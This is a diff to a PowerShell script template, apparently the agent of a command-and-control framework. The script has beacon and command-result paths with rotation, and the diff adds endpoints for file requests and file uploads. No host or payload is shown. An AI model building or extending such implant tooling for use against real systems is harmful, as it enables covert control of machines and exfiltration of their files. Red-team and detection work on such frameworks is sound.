@@ -8,6 +8,8 @@ $global:rotationInterval = {{ROTATION_INTERVAL}}
 $global:initialPaths = @{
     "beacon_path" = "{{BEACON_PATH}}";
     "cmd_result_path" = "{{CMD_RESULT_PATH}}";
+    "file_request_path" = "/file_request";  # Default path for file requests
+    "file_upload_path" = "/file_upload";    # Default path for file uploads
 }
 
 # Store current paths
@@ -28,7 +30,7 @@ function Update-PathRotation {
     if ($Paths -and $Paths.Count -gt 0) {
         $global:currentPaths = @{}
         foreach ($key in $Paths.Keys) {
-            if ($key -eq "beacon_path" -or $key -eq "cmd_result_path") {
+            if ($key -eq "beacon_path" -or $key -eq "cmd_result_path" -or $key -eq "file_request_path" -or $key -eq "file_upload_path") {
                 $global:currentPaths[$key] = $Paths[$key]
                 Write-Host "Updated path $key to: $($Paths[$key])"
             }
@@ -57,6 +59,8 @@ function Get-CurrentPath {
     switch ($PathType) {
         "beacon_path" { return "/beacon" }
         "cmd_result_path" { return "/command_result" }
+        "file_request_path" { return "/file_request" }
+        "file_upload_path" { return "/file_upload" }
         default { return "/$PathType" }
     }
 }
